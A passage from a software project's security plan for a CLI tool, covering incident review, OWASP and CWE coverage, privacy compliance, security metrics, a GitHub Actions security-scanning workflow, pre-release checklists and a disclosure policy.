   - Social media (if critical)

#### 5. Post-Incident Review

**Within 1 Week of Resolution**:

1. **Incident Report**:
   - What happened
   - How it was discovered
   - How it was fixed
   - Timeline of events
   - Lessons learned

2. **Process Improvements**:
   - What went well
   - What could be improved
   - Action items for prevention
   - Documentation updates

3. **Preventive Measures**:
   - Add security test for this issue
   - Update secure coding guidelines
   - Review similar code for same issue
   - Update threat model if needed

---

## Compliance & Standards

### OWASP Top 10 (2021) Coverage

| OWASP Risk | Relevance | Mitigation |
|------------|-----------|------------|
| **A01: Broken Access Control** | High | Path validation, workspace isolation |
| **A02: Cryptographic Failures** | Medium | Optional encryption, secure storage |
| **A03: Injection** | **Critical** | Input validation, no shell execution |
| **A04: Insecure Design** | High | Threat modeling, security review gates |
| **A05: Security Misconfiguration** | Medium | Secure defaults, config validation |
| **A06: Vulnerable Components** | **Critical** | Automated audits, minimal deps |
| **A07: Auth/AuthN Failures** | Low | Rely on provider CLIs |
| **A08: Software/Data Integrity** | Medium | Dependency verification, checksums |
| **A09: Logging Failures** | Medium | Secure logging, log sanitization |
| **A10: SSRF** | Low | No external HTTP requests from core |

### Security Standards Compliance

**CWE (Common Weakness Enumeration)**:
- CWE-78: OS Command Injection → Prevented by safe spawn
- CWE-22: Path Traversal → Prevented by path validation
- CWE-89: SQL Injection → Not applicable (no SQL)
- CWE-79: XSS → Not applicable (CLI tool)
- CWE-798: Hard-coded Credentials → Never store secrets

**SANS Top 25**:
- Covered: Command injection, path traversal, improper input validation
- Not applicable: XSS, SQL injection (web-focused)

### Privacy Compliance

**Data Collection**:
- ✅ Minimal data collection (only what's needed)
- ✅ User consent for telemetry (opt-in only)
- ✅ Clear data retention policy
- ✅ User data deletion on uninstall

**GDPR Considerations** (if applicable):
- Right to access: User can export memory
- Right to erasure: `automatosx memory clear`
- Data portability: JSON export format
- Privacy by design: No unnecessary data collection

---

## Security Metrics & KPIs

### Launch Metrics (v4.0.0)

**Zero Tolerance**:
- ✅ 0 critical vulnerabilities (P0)
- ✅ 0 high vulnerabilities (P1) unresolved
- ✅ 0 hardcoded secrets
- ✅ 100% security tests passing

**Targets**:
- ✅ SAST scan: 0 critical issues
- ✅ Dependency audit: 0 critical CVEs
- ✅ Test coverage: > 80% (including security tests)
- ✅ External audit: Passed with no P0/P1 findings

### Ongoing Metrics (Post-Launch)

**Daily**:
- npm audit results (automated)
- Dependency update status
- Security test suite status

**Weekly**:
- New CVE notifications
- Security issue count (open vs closed)
- Average time to fix (by severity)

**Monthly**:
- Dependency version freshness
- Security test coverage
- Incident count and trends

**Quarterly**:
- Full security audit
- Penetration test (recommended)
- Compliance review

### Success Criteria

**Phase 4 (Launch)**:
- [ ] Zero critical vulnerabilities
- [ ] All security tests passing
- [ ] External audit passed
- [ ] Documentation complete
- [ ] Incident response plan tested

**6 Months Post-Launch**:
- [ ] No security incidents (P0/P1)
- [ ] < 7 day average fix time (P2)
- [ ] > 95% dependency freshness
- [ ] All security patches applied within SLA

---

## Tools & Automation

### Required Tools

1. **SAST**:
   - ESLint Security Plugin
   - TypeScript strict mode
   - Semgrep (community edition)

2. **DAST**:
   - Custom security tests (Vitest)
   - Manual penetration testing

3. **Dependency Scanning**:
   - npm audit (built-in)
   - Snyk (free tier)
   - GitHub Dependabot

4. **Secret Scanning**:
   - git-secrets (pre-commit hook)
   - GitHub secret scanning

5. **Code Review**:
   - GitHub PR reviews
   - Security checklist

### CI/CD Integration

```yaml
# .github/workflows/security.yml
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 0 * * *' # Daily

jobs:
  sast:
    name: Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run lint:security
      - run: npm run typecheck

  deps:
    name: Dependency Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm audit --audit-level=moderate
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  secrets:
    name: Secret Scanning
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: trufflesecurity/trufflehog@main
        with:
          path: ./

  security-tests:
    name: Security Tests
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run test:security
```

---

## Related Documents

- [03-technical-specification.md](./03-technical-specification.md) - Security architecture
- [09-testing-qa-plan.md](./09-testing-qa-plan.md) - Security testing strategy (if exists)
- [12-cicd-devops-plan.md](./12-cicd-devops-plan.md) - CI/CD security integration (if exists)
- [13-release-strategy.md](./13-release-strategy.md) - Security advisory process

---

## Appendix A: Security Checklist

### Development Phase

**Every PR**:
- [ ] Input validation for all new inputs
- [ ] No shell execution (`shell: false`)
- [ ] Path validation for file operations
- [ ] No hardcoded secrets
- [ ] Sanitized logging
- [ ] Security tests added
- [ ] SAST passing

**Every Sprint**:
- [ ] Dependency audit passed
- [ ] Security test coverage maintained
- [ ] No new vulnerabilities introduced
- [ ] Security review of new features

### Pre-Release Checklist

**v4.0.0 Launch**:
- [ ] External security audit complete
- [ ] All P0/P1 issues resolved
- [ ] Dependency audit clean (0 critical/high CVEs)
- [ ] Security tests 100% passing
- [ ] Threat model updated
- [ ] Incident response plan ready
- [ ] Security documentation complete
- [ ] Team trained on security procedures

---

## Appendix B: Contact Information

**Security Contact**:
- Email: security@[domain] (if applicable)
- GitHub: Private security advisory preferred
- Response time: < 24 hours acknowledgment

**Responsible Disclosure**:
- Report security issues via GitHub Security Advisories
- Do not disclose publicly until fix is released
- Coordinated disclosure timeline: 90 days

---

**Document Version**: 1.0
**Last Updated**: 2025-10-03
**Status**: Draft - Ready for Review
**Owner**: Security Lead
**Next Review**: After Phase 0 validation

